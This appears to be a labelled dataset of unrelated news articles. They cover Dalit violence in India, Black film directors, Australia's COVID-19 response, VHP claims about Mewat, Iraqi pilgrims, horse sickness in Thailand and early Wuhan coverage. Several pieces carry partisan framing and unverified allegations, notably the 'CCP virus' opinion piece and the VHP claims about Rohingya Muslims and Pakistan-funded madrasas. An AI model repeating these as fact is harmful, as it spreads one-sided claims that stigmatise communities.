up after he receiving the money. “Now he is playing with the religious sentiments of the people of Punjab. He is asking innocent youth of Punjab to hoist the Khalistan flag and is offering them money in return but he is not sending money to anyone.” (IANS) This site uses Akismet to reduce spam.

0,"The husband of a Dalit village panchayat chief was allegedly beaten up and set on fire in Amethi on Thursday evening. Arjun Kori, 50, husband of Bandoiya village panchayat chief Chotka Devi, was rushed to Sultanpur District Hospital and later referred to the trauma centre of Lucknow’s King George Medical University. He died on the way. Superintendent of police Dinesh Singh said the family members of the victim had filed an FIR against a person called K.K. Tiwari and four others. “We are investigating the case and the guilty would be arrested soon,” Singh said. Chotka Devi said Tiwari and his goons were forcing her and her husband to give him kickbacks from the development fund. “They were not ready to listen to our plea that the fund is released by senior officers and monitored by them. We are not in a position to siphon off money from it. However, these people thought we were secretly making money. They called my husband on Thursday to discuss something. Later, some villagers told us that he was beaten up and set on fire,” the panchayat pradhan said. Surendra Kori, the son of the victim, accused police of inaction. “We had registered a complaint with the police a few months ago that some affluent villagers were threatening to kill the entire family if we didn’t pay them a monthly amount from the development fund. But no action was taken at that time,” he said. “The seat is reserved for the Scheduled Castes. Usually, the affluent villagers field Dalits on this seat and ensure their victory. They control everything once their candidate wins. But in our case, my parents resisted any misuse of their power,” Surendra added."

In putting together this list and its rankings, I took a look at quantity, critical acclaimed films and cultural impact (i.e films that moved the culture). Not to take anything away from other well known directors such as Spike Lee, the late John Singleton, Gina Prince-Bythewood, George Tillman Jr., and Lee Daniels, they have spent the last decade working on bringing exciting subjects to the small scene. 1.Ryan Coogler Coogler has emerged as the most prominent director with just three films. With Fruitvale Station, he won the top audience and grand jury awards in the U.S. dramatic competition at the 2013 Sundance Film Festival. He then co-wrote and directed the seventh film in the Rocky series, Creed. That grossed nearly $175M worldwide and then he helmed Marvel’s Black Panther, which not only broke numerous box office records, but also became the highest-grossing film of all time by a black director. 2. Tyler Perry When the decade started, there was no consistent director making films and bringing in big box office receipts other than Tyler Perry. Love them or hate them, his films brought in an audience that no box office expert had seen before. Led by his signature character, Madea, folks couldn’t get enough laughs. He’s one of the few directors who also writes and produces his projects, which brings in average gross of at least $60M and generates a 2-1 return on his investment. 3. Jordan Peele With just 2 films to his directing credits, Jordan Peele has catapulted himself among this list. His feature film debut, Get Out, shook the world when it came out in 2017. A $4M budget for a horror film that starred relatively unknowns (Daniel Kaluyya, Alison Williams) in, the film grossed a whopping $280m worldwide and a became a cultural phenomenon. For his follow up Us, it became the highest grossing original film in 2019. 4. Steve McQueen McQueen had three films in this decade (Shame, 12 Years a Slave, and Widows) but it was 12 Years a Slave that made him the first Black director to have a film win Best Picture. McQueen makes gritty stories that are very in your face and very revealing in the character study. The public can see the soul of the character through the eyes of his lead actors/ actresses. 5. Barry Jenkins It had been over a decade when Jenkins had released his first film, Medicine for Melancholy, to critical acclaim. There was great anticipation for his next film Moonlight and when it came out in 2016, it not only captured everyone’s attention, but went on the win the Academy Award for Best Picture. This was the first time a film with an all-Black cast took such an honor and he also won an original screenplay Oscar. His next film, “If Beale Street Could Talk” also garnered critical acclaim. 6. Ava DuVernay In this decade, DuVernay reinvented herself from film publicist to film director and she got her big break when she won the directing award in the U.S. dramatic competition at the 2012 Sundance Film Festival for her second feature film Middle of Nowhere, becoming the first black woman to win the award. Her second film, Selma, garnered her a Golden Globe nomination for Best Director, and she also the first black female director to have her film nominated for the Academy Award for Best Picture. In 2017, she was nominated for the Academy Award for Best Documentary Feature for her film 13th. In 2018, her film A Wrinkle in Time grossed over $100M at the box office, making her the first black female director to have that distinction. 7. F. Gary Gray F. Gary Gray had been relatively quiet in the beginning of the decade until he came back to the director’s chair with the NWA film Straight Outta Compton in 2015. Featuring mostly newcomers as part of the cast, this musical film did very well critically and financially. It not stood atop at the box office for 4 straight weeks, but it also grossed over $160M. Gray then went to direct the eighth installment of the Fast and the Furious franchise, The Fate of the Furious in 2017. With a total gross of $1.2B, it became the 18th highest-grossing film of all-time. With his last film being 2019’s Men in Black International, Gray is one of the few Black directors getting films with a $100M plus budget. 8. Antoine Fuqua Fuqua has been a muscular filmmaker who does action packed films that have been successful at the box office, includingThe Equalizer franchise with Denzel Washington doing his first sequel. Having done Southpaw and The Magnificent Seven remake to critical and financial success, let’s not forget that his direction of Olympus Has Fallen sparked two more sequels. 9. Tim Story Story is probably by quantity the most successful Black filmmaker when you throw in the Fantastic Fours from the previous decade to his successful run with the Think Like a Man and Ride Along franchises. One can say he’s a chameleon filmmaker who shows his versatility whether it’s action packed or comedy driven. He can work and do well in both fields. 10. Malcolm D. Lee Having worked over 15 years in the business, Lee finally gave us the sequel to his film debut Best Man with Best Man Holiday and it proved well at the box office, and then hit a home run with Girls Trip, which is one of the funniest Black films of the decade and introduced us to rising star Tiffany Haddish. Haddish went to star with Kevin Hart in Lee’s box office hit Night School. See more Your email address will not be published.

As of May 24, with a population of 25.7 million, Australia has seen approximately 7,110 cases of infection and 102 deaths as a result of the CCP (Chinese Communist Party) virus. In contrast, as of May 24, Canada, with 37.9 million people, recorded over 84,000 cases and more than 6,300 deaths. By early April, Financial Times journalist John Burn-Murdoch had already taken note: “Australia a rare example of an Anglophone country on a gentle trajectory,” he wrote in a tweet. Now that more businesses are reopening and more internal travel bans are being lifted, some sense of normalcy is gradually returning. While no one knows when and how the pandemic will end, it’s important to reflect on how a country like Australia managed to beat the odds and what it can do to stay the course as it tackles the complex challenges ahead across all sectors of society. In this regard, much of Canberra’s success appears to stem from its vigilance and determined action when it comes to the Chinese communist regime. A key move that helped Australia contain the spread of the virus was closing the border to visitors from China on Feb. 1—despite Beijing’s protestations and against World Health Organization (WHO) advice. This was “the right decision” and “one of the most important decisions made by an Australian government in decades,” Health Minister Greg Hunt recently told Sky News. Shortly thereafter, the Chinese regime’s hoarding of personal protective equipment in January and February, such as masks, gloves, gowns, and hand sanitizer, led to shortages worldwide. Australia was no exception. As The Epoch Times previously reported, the regime had directed its United Front Work Department to mobilize overseas pro-Beijing groups to buy large quantities of these vital medical supplies and ship them to China. Greenland Group and Risland, two Chinese-linked companies in Australia, were widely reported by Australian media to have sent large volumes of protective equipment to China. According to Chinese government data, Beijing amassed an estimated 2.5 billion pieces of protective equipment in just two months. Canberra promptly announced a ban on the non-commercial export of these supplies, stipulating fines and jail terms for violating the ban. Meanwhile, global concerns arose over foreign takeovers of distressed companies amid the pandemic, especially by authoritarian states like Beijing, that could undermine supply chains and countries’ national security. In response, on March 29, Australia’s Treasurer Josh Frydenberg announced changes to the country’s foreign investment review policy, requiring every proposed foreign takeover to be reviewed regardless of value. This was to avoid “predatory behaviour that is not in the national interest” and would be effective for “the duration of the current crisis,” he said. Coincidentally, data from Australia’s Health Department indicated a noticeable downward trend of new daily cases shortly after that day, continuing until today. Then in mid-April, Australian Foreign Minister Marise Payne called for an independent review into the pandemic’s origins including Beijing’s handling of the initial outbreak in Wuhan. She quickly received backing from shadow foreign minister Penny Wong followed by support from Prime Minister Scott Morrison and others. The Chinese regime tried to discredit the request by accusing Canberra of politicizing the pandemic and warning that Chinese citizens may boycott Australia in various areas including beef, wine, tourism, and international students. When Canberra refused to back down, Beijing banned beef imports from four major Australian producers and imposed 80 percent tariffs on Australian barley. Despite Beijing’s disinformation and economic coercion, Canberra remained firm, winning support from over 120 countries for a co-sponsored motion seeking an independent evaluation of the global response to COVID-19 including the source of the virus and its route of transmission to humans. The WHO passed the motion at a virtual assembly on May 19. Australia’s vigilant response to the CCP during the pandemic is consistent with Canberra’s actions in recent years that clearly show its growing awareness of the urgency and necessity of resisting the threats posed by the communist regime. These threats are not limited to health and economic consequences but also include significant political interference and espionage activities. In 2016, Prime Minister Malcolm Turnbull commissioned a report on the extent of foreign interference in Australia. The classified report, which was leaked to the media in 2018, found that the CCP had over the past decade been making attempts to influence Australian political parties and policy-making at every level of government. In response, Turnbull’s government introduced legislation that banned foreign donations to political candidates, broadened the definition of espionage activities, and required all those working on behalf of foreign entities to publicly declare who they are working for. Australia was also one of the first countries to ban Huawei from its 5G networks on national security grounds. In 2018, Canberra blocked Huawei from providing 5G technology to Australia, while barring ZTE, another Chinese tech company, at the same time. “The fundamental issue is one of trust between nations in cyberspace,” wrote Simeon Gilding, a senior fellow at the Australian Strategic Policy Institute (ASPI), in a commentary in January. “Over the past decade, the Chinese Communist Party has destroyed that trust through its scaled and indiscriminate hacking of foreign networks and its determination to direct and control Chinese tech companies,” added Gilding, who until December 2019 was head of the Australian Signals Directorate’s signals intelligence and offensive cyber missions. Due to concerns about cyber attacks originating from China, Australia had already excluded Huawei from bidding on a project to build out the country’s national broadband network back in 2012. Canberra’s vigilance combined with informed and timely action against the CCP could well be the most significant factor contributing to Australia’s much-better-than-expected pandemic outcome thus far. It also attests to the kind of sound China policy and direction that will likely continue to serve the country well in the critical times ahead. In this context, there is bipartisan backing and broad public support for Canberra’s decisions including its Huawei ban and its leadership in pushing for a global inquiry into the pandemic. And Beijing’s overt use of coercion and disinformation has damaged its own image and helped to alert Australians to the serious threat that it poses. “Managing relations with an assertive China requires Australian patience, consistency and steadfastness on policy over the long term,” wrote Richard Maude, executive director of policy at the Asia Society Australia, in an article in May. Maude is also a former Australian deputy secretary of foreign affairs and trade. “The task is harder because China increasingly is conducting its diplomacy in a manner it would never accept from others. That diminishes China but is the nature of authoritarian power.” Vicky Xiuzhong Xu, an analyst at the ASPI, wrote in an opinion piece that “Australia must not bow to China but seek wider trade options” and “look to our real friends.” In her article, published by the Sydney Morning Herald on May 21, Xu advised forming a strong alliance with like-minded nations and thinking long-term in reducing reliance on China to better allow Australia to overcome Beijing’s tactics. A survey by Newgate Australia conducted in the third week of May shows that 79 percent of Australians believe the country is responding to the pandemic at an appropriate level and that 67 percent believe the government is doing a “good” or “excellent” job. Despite concerns about the economy and jobs, “Australians continue to have strong faith in the performance and actions of government,” the survey found. Australia’s prime minister in turn has strong faith in his spiritual belief. In a video published in March on the Eternity News website, Morrison says a prayer for his country and people as well as his government colleagues. He prayed for God to “give us strength in this country, give us wisdom, give us judgment, give us encouragement, and let your peace reign.” Morrison has also declared that Australia would never “trade away our values” and would deal with other countries “fairly and honestly and openly,” reported The Guardian in May. “We have always been independent … and we will always stand our ground when it comes to the things that we believe in and the values that we uphold,” he said.

0," Jajpur (Odisha): Four more persons, including a constable, were arrested on Friday in connection with the alleged kidnap and rape of a 16-year-old Dalit girl in Odisha's Jajpur district, police said. The girl was allegedly kidnapped and raped by two persons near Chandikhol in the district on January 14 and was later found unconscious near Barabati village on January 18, according to the FIR lodged by her father. The arrested persons are the main accused's brother-in-law who is a constable in Dharmasala police station, maternal aunt, cousin and an aide, a police officer said. With this development, the total number of persons arrested in the case has risen to eight, he said. The prime accused, his brother and two sisters were arrested on January 20. The two women were arrested for allegedly sheltering their brothers and the girl at their residences, the officer said.

0,"New Delhi, June 12: The Vishva Hindu Parishad (VHP) has expressed its displeasure with the Manohar Lal Khattar-led BJP government in Haryana over ""soft-pedaling"" of alleged persecution of Dalits and religious conversion of Hindus in the Mewat region of the state. VHP sources said the Hindu group did not expect an ""indifferent attitude"" of the state government, that too when Khattar himself comes from the 'Sangh' background. A VHP delegation had met the Chief Minister last month, but the government has not taken any step in investigating the cases nor has it filed cases against the suspects. ""We fail to understand the compulsions of the government; it only reflects the indifference of the ruling dispensation,"" said a VHP leader. Ayodhya Ram Mandir Trust Donations Affected Due to COVID-19 Spread And Lockdown, Body Receives Rs 4.70 Crore in 2 Months. ""Anti-Hindu elements in Mewat feel encouraged by the government's attitude. No Hindus are left in over 100 villages of that region. We are capable of protecting Hindus' interests and are not dependent on any government. But we hope the government would fulfill its responsibility,"" VHP's national spokesperson Vinod Bansal told IANS. Located around 75 km south of Delhi, Mewat district was carved out of Gurugram and Faridabad in 2005 by the Congress government. In 2016, the Khattar government changed its name to Nuh. The VHP and other Sangh outfits have alleged large-scale religious conversion and Dalit persecution in some villages of Mewat. VHP's Joint General Secretary Surendra Jain led a team and met the CM last month and handed him a startling report that claimed that Hindus have migrated from 103 villages out of the total 500 and the community is reduced to a ""hopeless minority"" in 84 other villages. Parishad leaders said the CM had assured them of investigation into the matter. ""The police in that region do not register cases involving kidnapping of Dalit girls and sexual assaults on them. Large chunks of land are being forcibly registered in others' names and temples are being taken over, forcing migration of Hindus. But now the government will not only have to pay attention to such criminal acts, but also act decisively against the perpetrators,"" said Surendra Jain. Bansal said former Justice Pawan Kumar has investigated incidents of Dalit persecution and a team, formed at VHP's instance and led by G.D. Bakshi, has submitted its report. National Commission for Scheduled Castes executive member Dr Ramshankar Katheria too has visited the area and investigated the cases. ""Anti-national activities are continuing in the area which has now become a hub of Rohingya Muslims. Funding from Pakistan has enabled many five-star madrasas to function from the region. In one instance in 2018, the National Investigation Agency (NIA) arrested a youth in a case of Laskhkar-e-Taiba (LeT)-funded madrasa. Since this area is close to the national capital, the probe agencies must keep a close watch on it,"" said Bansal. (The above story first appeared on LatestLY on Jun 12, 2020 07:52 PM IST.

0,"Stealing around barbed-wire barriers through fields and side streets, dozens of black-clad Shiite pilgrims in Baghdad defied curfews and coronavirus this week to visit the shrine of a revered imam. Seeking to stem an outbreak of the COVID-19 pandemic, more than half of Iraq’s 18 provinces have declared curfews of several days. Baghdad, the Arab world’s second most populous capital with 10 million inhabitants, imposed a curfew from Tuesday evening for six days. But the government’s social distancing efforts are facing a hurdle, as pilgrims defy restrictions to commemorate the anniversary of the death of revered Shiite Imam Musa al-Kadhim. The anniversary, which will be marked on Saturday, typically draws millions of pilgrims from around the world each year to Baghdad, to visit and kiss the gold-domed shrine housing the imam’s resting place on the banks of the Tigris River. Traditionally, pilgrims converge on foot on the imposing complex to pray and take part in mourning ceremonies that lasts several days. Top cleric Grand Ayatollah Ali Sistani has urged Iraqis not to gather in large numbers for prayers, where risk of contamination could be high, and declared the fight against the novel coronavirus a “sacred duty”. Iraq has imposed travel restrictions and shuttered shrines across the country, including that of Imam Kadhim. On Wednesday, Iraqi troops stationed around the site tried to persuade fervent pilgrims to return home. “It’s for your own health that we’re doing this,” one soldier told an elderly woman in the street. “No one can prevent us from visiting our imams! Not terrorism, not war, not a virus!” she shot back. Musa al-Kadhim, the seventh of 12 imams venerated by Shiite Muslims, died in 799 while in detention by Abbasid caliph Harun al-Rashid. At another checkpoint, a group of around 20 men waved flags bearing yellow and green religious emblems as they tried to make their way past soldiers blocking the street. In contrast, the holy Shiite shrine city of Najaf, south of Baghdad, was markedly quiet. The mausoleum of the Prophet Mohammad’s son-in-law Ali was shut and its usually busy esplanade empty, an AFP photographer said. Health authorities have reported 13 deaths and 164 infections in Iraq from the novel coronavirus. However, many suspect the number of cases could be higher, as fewer than 2,000 people have been tested in a country of 40 million. Iraqis have expressed fear over the impact of a large outbreak in the country, as years of conflict and poor investment have ravaged the country’s health system.

0,"equine news, research, and information  Deadly African Horse Sickness has been detected in Thailand, killing at least 42 racehorses in the northeast of the country. The disease is endemic in sub-Saharan Africa and is spread by biting midges. Horses are considered the most susceptible, with nearly 90% dying if infected. It kills roughly half of infected mules and 10% of donkeys. Infected African donkeys and mules rarely show signs of disease. The Thailand outbreak is understood to be the first time the disease has been confirmed in the country. It is centered in the Pak Chong area, according to the Thailand Equestrian Federation’s veterinary adviser, Dr Metha Chanda. Chanda told the International Equestrian Federation’s veterinary director, Dr Göran Akerström, in a letter on Saturday that the emergence of the disease had been confirmed by the country’s Department of Livestock Development (DLD). Authorities have suspended the movement of all horses and equine species within a 150km radius of the outbreak. People are required to report any sudden death or suspected cases to the DLD. “Restricted movement and good hygiene must be followed among the horses located outside of the outbreak zone,” Chanda says. Checkpoints will be watching for any illegal movements of equines. “Further measures may be launched to minimize and control the outbreak of the disease,” he says. Chanda says 42 horses have been reported dead so far out of 62 cases. He says 341 horses in the outbreak area are susceptible to the disease. He says the reaction of the Thailand Equestrian Federation has been swift, with members told to restrict horse movements and to follow relevant measures advised by the DLD. “Our deepest sympathy goes out to those who have lost horses due to this terrible virus. We are monitoring the situation closely and will continue to update everyone and follow all protocols in order to best protect all horses in Thailand,” he says. It is understood the deaths have occurred across several barns in the outbreak area. Latest research and information from the horse world. No one indicates the source of the outbreak.But a convoy of 25 trucks made its way from the airport with wild animals on Jan 28-29. 2 giraffes fell out of a truck and one subsequently died. The convoy contained zebras.Carriers asymptomatic of African Horse sickness. Was there a breach in quarantine protocols?

0,"No state on the African continent has been left the same in the wake of the COVID-19 virus. The past few weeks have see nations dishing out billions and instituting lockdowns to combat the virus. In a bid to join forces against the virus, French president Emmanuel Macron had a conference call on Friday with key African heads of state. They included; Rwanda, Senegal, South Africa, DR Congo, Egypt, Mali, Ethiopia, Zimbabwe, and Kenya. Key issues discussed included the need for Africa to stand together, speak with one voice and work through financial institutions to mobilize resources and harmonise the support from international partners. Significantly absent at the conference call, was Cameroon’s President Paul Biya who has gone incognito for the past weeks. Despite attempts from communication Minister, Emmanuel Sadi to dismiss rumours of Biya’s death, demands for physical proof keep increasing. After Biya failed to heed to a seven-day ultimatum by the CRM’s Kamto to address Cameroonians in person, he has been given another seven days to proof he is in control. In case Biya fails to do so, “we would be forced to initiate adequate legal procedures to obtain confirmation, by the competent bodies, of the presidential vacancy and its constitutional consequences” Kamto says. While it is unlikely that the President will respond, many believe his surprising absence from Macron’s conference call may be a signal of deteriorating relations with France or even more. MMI  "
0,"The absence of remembrance and commemoration of leaders like Dakshayani Velayudhan is not unusual these days. Dakshayani, who passed away on this day (July 20) in 1978, was the only Dalit woman member of the Constituent Assembly of India. There are many firsts associated with the life of Dakshayani Velayudhan. To start with, she was the first Dalit woman graduate of India. The contemporary narrative of gender in India hardly encapsulates the Dalit component, regardless of having such towering personalities who defied conventional wisdom and led a revolution in their own realm. Recounting her initial days of struggle, Dakshayani had said, “I was the only girl student for B.Sc Chemistry or for any science subjects in the college. It was ‘sheer luck’ to get higher education. (In the laboratory) an upper caste teacher did not show me experiments — I learnt things by looking from a distance and graduated with a high second class in 1935. In July 1935, I was posted as an L-2 teacher in the High School Peringothikara in Trichur District.” It is important to confront such hard realities that are still being faced by Dalits across the country. Inspired by Ayyankali — one of the greatest social reformers of the 20th century, Dakshayani set out on the journey to address the civilisational fault lines of our society. There are many firsts associated with the life of Dakshayani Velayudhan. (Photo: Facebook/ Meera Velayudhan) The group of men and women who drafted the Indian Constitution were people of great eminence with vision and foresight. Being the only Dalit woman in that congregation is a remarkable indication of a social revolution at multiple levels. At the young age of 34, Dakshayani not only made herself heard in the premier decision-making body of the country, but also ensured that the opinion of the marginalised was accounted for. The intellectual establishment in the post-independent India overworked to promote a single individual, and thereafter a family, to determine them as the sole custodian of the claim over the Independence struggle. The sheer amount of academic investment in promoting Nehru and the Nehru-Gandhi family reeks of a deeper conspiracy to progressively obliterate the insurmountable contributions of the galaxy of other leaders of the freedom struggle. Dakshayani is one such victim along with many other unsung leaders, who will be gone from the pages of history textbooks. Dakshayani Velayudhan (top right corner) — the only Dalit woman member of the Constituent Assembly — with the rest of the women members of the Assembly. (Photo: Centre for Women’s Studies). On her 42nd death anniversary today, we must remember her noteworthy contributions and initiate a public conversation on the status of Dalit women in the country who are facing the double whammy of caste and gender every day. In one of her earlier speeches in the Cochin Legislative Council, Dakshayani voiced her concerns for the depressed classes. She said that unless untouchability was legally abolished and supplemented with strong welfare measures for the upliftment of the marginalised, the usage of the term ‘Harijan’ for them is like addressing dogs as Napoleon. ‘Harijan’ was a patronising term then and it still is now. As someone from the fraternity, I assert that the community as a whole must be a key stakeholder in determining suitable terminologies for themselves. Every term has a trajectory and a journey that is telling of evolving circumstances. Depressed classes, Scheduled Caste, Harijan and now Dalits. Dalit represents an assertion and a will to be heard. The new-age Dalit struggle is no longer limited to a seat in government-sponsored educational institutions and employment. The life and times of Dakshayani need to be studied to generate intellectual curiosity towards the struggles and rise of Dalit women. The Dalit movement today is ill-advisedly stuck in the past. With the Constitution as a fundamental document, Dalits across the country must have a sense of ownership not only because of Ambedkar, but also because of leaders like Dakshayani, Babu Jagjivan Ram and many other leaders who ensured a safe, secure and a sustainable future for the subalterns. Dignity, respect and equality in everyday interaction are what the new-age Dalit women and men like me aspire for. The civil society, political class and the academic establishments must realise this and be willing to share positions for the socially-marginalised and historically oppressed people in the structures of power and privilege.

0,"Published 8:52 am Thursday, February 20, 2020 By Hannah Holliday DOWAGIAC — A permanent exhibit featuring artwork by a local Dowagiac artist is now on display at the Dowagiac Area History Museum. On Tuesday afternoon, a formal dedication was hosted to introduce a new permanent exhibit, “Time Brings About a Change,” with two wood burning art pieces, “Time Brings About a Change,” and “For Who?” both created by O’Larry Collins. “Time Brings About a Change,” features three African Americans who had significant impacts on Dowagiac and Michigan’s history, Thomas Jefferson Martin, Chief George Grady and Sam Fowlkes, said Museum Director Steve Arseneau. “It means a lot as an artist,” Collins said on Tuesday, standing in front of his work. “As a black artist and knowing George Grady and knowing Sam Fowlkes, it was a beautiful thing. They are real, nice, good people. It was a privilege for me to do [the piece]. When Mayor [Don] Lyons approached me about doing them, I thought so much of him for wanting to have that done for us here in Dowagiac.” Representing George Grady, a Dowagiac native and decorated Korean War veteran, was his son, Dennis Grady, who said he had waited 43 years for someone to honor his father’s sacrifice and dedication to Dowagiac. “My dad and I would have private conversations, and sometimes, he would get me up at 3 a.m.,” Dennis said. “One thing I remember about my dad was a lot of times, I cleaned his guns and shined his shoes. To this day, when I shine my shoes, I still remember what he had me do. He would talk to me about being a gentleman. He would say ‘Denny, if you are going to be anything, be a man.’” George served as a deep-sea diver in the U.S. Navy during the Korean War. In 1955, he returned to Dowagiac and joined the police force. George rose through the ranks and, in 1965, was named the first African American police chief in the state of Michigan. He died at the age of 44 from a heart attack. Dennis joined the Michigan State Police in 1979 and retired in 2003 after a 25-year career. He still remembers thinking of his dad while in the academy. “I will die here before I let him down,” Dennis said. Sam Fowlkes was one of Dowagiac’s local civil rights organizers and a leader in the African American community for decades, Arseneau said. Representing the Fowlkes family was Tyree Blackamore, the ninth grandson of Sam and Bessie Fowlkes. “The two of them taught us to be proud, to be of standing members of the community, to speak for truth and injustice and to offer a hand to all— no matter the color of one’s skin or social status,” Blackamore said. “[Fowlkes] had an amazing ability to see the big picture and what that might mean for the community as well as us.” Blackamore remembered when Fowlkes was reelected to Dowagiac City Council. He was often answering questions from residents of his ward and sharing his views on different situations. Fowlkes was a local businessman and one of the first African Americans to serve on the city council. He served from 1965 to 1971 and again from 1986 to 1997. He also served on the Cass County Planning Commission from 1968 to 1997 and served as vice-chairman from 1988 to 1996. In 1947, Fowlkes worked at Dowagiac Steel Furnace, while putting time towards his own upholstery shop, Fowlkes’ Upholstery. In 1962, Dowagiac Steel Furnace closed, and Fowlkes started driving school buses for Dowagiac Union Schools. He retired from the school district in 1979 but kept his upholstery business into the 2000s. Lastly, Thomas Jefferson Martin’s remarks were made by Arseneau as his family line ended with his son, C. Fabe Martin, who had no children. Martin was born in Tennessee to a white politician and his slave mistress. In 1820, Martin’s father granted him freedom. He became a barber and worked on steamboats alongside the Mississippi and Ohio Rivers. He was also active on the Underground Railroad in southern Indiana. In 1855, he planted roots in Dowagiac and opened his own barbershop. He quickly became a leader of the state’s African American community as the elected chair of the first Michigan convention of African American residents hosted in Battle Creek in 1860. Martin would later call the second convention in 1884. He also led the state’s Prince Hall Free and Accepted Masons Lodge. The exhibit was made possible by a donation from Don and Joan Lyons, of Lyons Industries in Dowagiac. “When I first went into Mr. Collin’s shop and saw his work, “For Who?” I was dumbstruck,” Don Lyons said. “That was one of the most powerful images on the tragedy of racism that I thought I’d ever seen.” Lyons said the image stuck with him for days, weeks and months afterward. He thought if it had such a positive impact on him, it needed to be shared. Collins, who is also a downtown merchant, owns Art Enuh Suit. “One of the things we are focusing on is to make the community more inclusive,” Lyons said. “If you go downtown, you don’t nearly have the African American presence that we would like to see.” As the reception was about to end, Arseneau hoped this permanent exhibit would be the start of a larger one. By 1910, Cass County had the highest concentration of African American residents in Michigan, outside of Detroit and Grand Rapids, according to census records, Arseneau said. “Later, Dowagiac was a landing spot for many African Americans who fled the south to find work in factories and the rust belt during and after World War II,” he said. “Many of the families here today are a result of the migration during the post-war period.” Arseneau encouraged families to look around their homes for artifacts and photographs to help tell the story of those families in Dowagiac and Cass County. “Let’s make this the beginning of the museum’s relationship with the families here today and the local African American community,” Arseneau said. “This is your museum, too.”"

0,"by SA Wine Industry | Apr 7, 2020 | Covid-19 The South African wine industry has received permission to export its products, following intensive lobbying by an Industry Exporters Task Team with Government on the matter over the past week. On Tuesday afternoon, 7 April 2020, the Minister of Transport gazetted new Directions under the lockdown Regulations to expressly permit the export of wines and other fresh produce products. The regulations stipulate that wines are permitted to be exported and agricultural cargo to be moved to sea ports and international airports for export. The Minister of Transport has permitted the following expressly:“During the lockdown period, the transportation of the wines and any other fresh produce products at the sea ports and international Airports Designated as Port of Entry for export is allowed” The notice also stated the following:“Agricultural Cargo is allowed to be transported to sea ports and International Airports Designated as Ports of Entry and exported to the relevant destination” Download the latest Government Gazette:Disaster Management Act 57 of 2002 – Sea ports 7 April 2020 The Exporters Task Team is still taking all aspects in the Gazette into consideration and will meet soon to discuss and communicate all relevant operational activities. The South African wine industry is truly grateful to Government and all the respective role-players for showing an understanding for the industry’s challenges through this concession, as nearly half of South Africa’s wine production is exported and a restriction on exports would have a severe effect on wine-related businesses, but most importantly the livelihood of close to 300 000 people employed by the wine industry value-chain. The latest decision by Government follows on an earlier concession for the wine industry to complete harvesting and processing activities to prevent wastage during the 21 day lockdown. Amidst the excitement from the industry about these concessions, we need to reiterate that with this concession comes a great responsibility to keep our employees safe during this time.

0,"By Tyler Durden As we move into Saturday evening on the ground in Wuhan, it’s becoming increasingly obvious to the broader global community that China’s authoritarian government has failed to contain this viral outbreak. Chinese authorities expanded the travel restrictions on Saturday to cover 56 million Chinese, Al Jazeera reports. At least 18 cities in central Hubei are now dealing with at least some level of travel restrictions. In Wuhan, the situation looks grim. The number of confirmed cases is exploding: another 300 were announced on Saturday, while the death toll is steady at 41. Yesterday, videos flooded Western social media (after being assiduously removed from Weibo and the rest of the Chinese Internet) purporting to show bodies piling up in hallways in Wuhan, with rumors that a doctor had succumbed to the virus. Those rumors have now been confirmed: A doctor who worked at a hospital in Wuhan, China, where coronavirus patients are being treated died Saturday morning, according to the Wall Street Journal. Meanwhile, a two-year-old Chinese girl has become the youngest to be diagnosed with the virus. As it has all week, the South China Morning Post has kept an up-to-date running total of the confirmed cases & deaths. As of 10 am ET on Saturday, the total number stood at exactly 1400.  A map of the various cases shows the spread, though even the most up-to-date maps by Western news agencies appear to already be out of date, including this one by BBG.  Though China has pledged transparency, some suspect that the true tally of cases within Wuhan is much higher. With the epidemic spiraling out of control, President Xi called a meeting of the Politburo Standing Committee, a group of China’s top leaders, to discuss a response to the virus. At the meeting, the Communist Party set up a group to manage the response to the virus. The group will comprise members of the Party’s Central Committee, while being directed by the Standing Committee. During the meeting, President Xi said various ethnic groups must work together to contain the spread of the deadly virus. Xi also ordered party authorities to ensure that there are enough medical supplies in Wuhan – the capital of Hubei province and a city of 11 million five times the size of London and bigger than any US city. “Party committees and governments at different levels have to make proper plans to contain the virus under the guidance of the Central Committee,” he was quoted as saying. China’s National Health Commission announced on Saturday a nationwide plan to identify suspected cases of the deadly virus on trains, airplanes and buses. Inspection stations will be set up and passengers with suspected pneumonia will be “immediately transported” to a medical center. In the city of Haikou, the authorities said they would set up a 14-day observation center for all tourists who came from Hubei. They will not be allowed to leave the hotels where they are staying. At least 450 additional military and medical personnel have been deployed in Hubei to help with the situation. Following reports last night of a suspected case in Sydney, Australian authorities have confirmed the first case of the virus. Yesterday, several cases were also identified in France. But that’s not all: Malaysia has confirmed that three cases of the virus have been detected. Japan is now up to three cases, all Chinese nationals, according to the Nikkei Asian Review. Following reports that the virus may have originated from people eating bats or rats, the party has ordered more inspections of agricultural products, and has temporarily banned the trade in wild animals. It has also shut down movie theaters, LNY-related events and other mass gatherings across the country, warning that people should avoid coming together en mass until the outbreak is contained. Qinghai province in northwestern China confirmed its first case on Saturday, leaving Tibet as the only administrative area of China that remains virus-free. In Wuhan, the horror stories are getting worse: One woman told the SCMP that her husband was turned away by several hospitals despite coughing up blood, a sign of very advanced pneumonia. “I have nothing. No protective clothing, only a raincoat, and I am standing outside the hospital in the rain,” said the woman, who gave her name as Xiaoxi. “I am desperate, I have lost count of time and days. I don’t know if we will both live to see the new year.” The rapid rise in the number of cases doesn’t necessarily mean the outbreak is getting worse, according to a spokesman from the WHO. Instead, it could reflect better monitoring and intervention by government authorities. As far as determining the severity of the epidemic, it’s still too early to say. “It’s still too early to draw conclusions about how severe the virus is because, at the beginning of any outbreak, you would focus more on the severe cases,” said Tarik Jasarevic, a spokesman for the World Health Organization in Geneva. Video from inside Wuhan, a city that has been nearly entirely sealed off from the outside world, the situation appears increasingly dire.  A lot of attention has been paid in the Western press about the effort to build a new, 1,000-bed hospital in Wuhan as the city’s current health-care infrastructure has been completely overwhelmed. They’re hoping to finish the building in under a week, an astonishing pace. State media reported Saturday that a second hospital will also be built.  Foreign governments including the US and Russia are hatching plans to air-lift their citizens out of Wuhan. This could include journalists covering the outbreak, meaning the flow of information out of the city could soon slow to a trickle. Meanwhile, scientists are scrambling to determine the virus’s infectious potential before victims start showing symptoms. If it’s confirmed that the virus spreads in this way, than that would make full containment virtually impossible. Article source: Zerohedge.com Subscribe for natural health news to your inbox.

